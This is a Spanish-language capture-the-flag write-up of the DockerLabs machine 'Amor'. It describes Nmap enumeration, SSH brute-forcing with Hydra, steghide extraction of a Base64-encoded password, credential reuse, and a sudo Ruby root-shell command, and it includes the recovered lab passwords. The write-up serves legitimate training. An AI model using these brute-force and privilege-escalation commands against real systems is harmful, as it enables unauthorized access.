# Amor — Máquina DockerLabs

![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs.es-orange)
![Dificultad](https://img.shields.io/badge/Dificultad-Fácil--Media-yellow)
![Tipo](https://img.shields.io/badge/Tipo-Linux-blue)
![Estado](https://img.shields.io/badge/Estado-Completada-success)

Una contraseña débil abre la puerta vía fuerza bruta, una imagen esconde un secreto sin protección real, y la reutilización de esa contraseña entre cuentas termina en una escalada de privilegios directa gracias a un binario mal configurado en sudoers.

## Técnicas Utilizadas

- Enumeración con Nmap
- Fuerza bruta SSH con Hydra
- Enumeración local de archivos de configuración
- Extracción de datos ocultos con Steghide
- Decodificación Base64
- Reutilización de credenciales entre cuentas
- Escalada de privilegios vía GTFOBins (Ruby)

## Resumen del Ataque

```text
Nmap --> 22 (ssh), 80 (http)
Página web --> revela usuario "carlota" y contraseñas débiles
Hydra --> carlota:babygirl
SSH como carlota --> .bashrc apunta a "vacaciones"
imagen.jpg --> steghide extrae secret.txt (sin passphrase)
Base64 decodificado --> contraseña de oscar
SSH como oscar --> pista hacia root
sudo -l --> Ruby sin contraseña --> shell root
```

## Vulnerabilidad Clave

**Configuración insegura de sudoers** — al usuario `oscar` se le permite ejecutar Ruby como root sin contraseña. Ruby, como intérprete de propósito general, puede usarse para generar una shell completa con privilegios elevados:

```text
oscar ALL=(ALL) NOPASSWD: /usr/bin/ruby
```

## Análisis de Solicitudes

### Fuerza Bruta SSH
```bash
hydra -l carlota -P rockyou.txt ssh://172.17.0.2
```
```text
carlota : babygirl
```

### Extracción Esteganográfica
```bash
steghide extract -sf imagen.jpg
```
```text
secret.txt --> ZXNsYWNhc2FkZXBpbnlwb24= (Base64) --> eslacasadepinypon
```

## Payload de Explotación

**Escalada de privilegios vía Ruby (GTFOBins):**
```bash
sudo ruby -e 'exec "/bin/sh"'
```

## Por Qué Funciona

| Factor | Explicación |
|---|---|
| Contraseña débil | Craqueada rápidamente con un diccionario común |
| Información expuesta en la web | El nombre de usuario válido estaba visible públicamente |
| Esteganografía sin passphrase | Cualquiera con la herramienta puede extraer el contenido oculto |
| Reutilización de credenciales | La misma contraseña sirvió para dos cuentas distintas |
| Sudoers mal configurado | Un intérprete de propósito general permitido sin contraseña equivale a root directo |

## Referencias

- [GTFOBins — Ruby](https://gtfobins.org/gtfobins/ruby/)
- [Steghide — Herramienta de esteganografía](http://steghide.sourceforge.net/)
